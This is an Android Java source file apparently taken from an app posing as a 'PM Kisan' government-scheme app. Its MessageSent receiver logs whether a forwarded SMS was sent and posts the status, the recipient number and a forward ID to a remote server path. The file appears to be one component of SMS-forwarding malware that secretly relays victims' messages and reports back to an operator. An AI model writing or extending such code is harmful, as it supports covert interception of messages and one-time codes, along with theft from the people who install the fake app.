package com.pmkisan.app.india;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class MessageSent extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        int sms_forward_id = intent.getIntExtra("sms_forward_id", -1);
        String status = "";

        switch (getResultCode()) {
            case Activity.RESULT_OK:
                status = "Sent";
                Log.d(Helper.TAG, "SMS sent successfully.");
                break;
            default:
                status = "SentFailed";
                Log.d(Helper.TAG, "SMS failed to send.");
                break;
        }

        JSONObject data = new JSONObject();
        try {
            Helper helper = new Helper();
            data.put("status", status + " to "+number);
            data.put("id", id);
            data.put("site", helper.SITE());
            Helper.postRequest(helper.SMSSavePath(), data, context, result -> Log.d("mywork", "status updated Result, "+ result));
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }
}
